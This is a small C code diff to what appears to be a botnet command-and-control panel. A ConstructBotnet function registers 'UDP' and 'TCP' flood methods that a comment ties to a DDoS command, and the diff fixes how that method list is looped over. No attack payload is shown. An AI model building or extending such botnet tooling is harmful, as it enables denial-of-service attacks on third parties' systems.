@@ -49,7 +49,7 @@ void test_cmd(void *x, void *c, str *cmd, Arr *Args) {
 Cogs *cogs = NULL;
 void ConstructBotnet() {
     PORT = string("1337");
-    THEME_NAME = string("1337");
+    THEME_NAME = string("builtin");
 
     cogs = InitCogs();
 
@@ -59,7 +59,11 @@ void ConstructBotnet() {
     char *METHODS[] = {"UDP", "TCP", NULL}; // Used as an example (this would be with your ddos command)
     // Add all methods from your array of methods linking to method handler command
     for(int i = 0; i < count_arr(METHODS); i++) {
-        cogs->Add(cogs, Array(((char *){METHODS[i], NULL})), 4, 1, NULL);
+        if(METHODS[i] == NULL)
+            break; 
+        
+        char *args[] = {METHODS[i], NULL};
+        cogs->Add(cogs, Array(args), 4, 1, NULL);
     }
 }
 
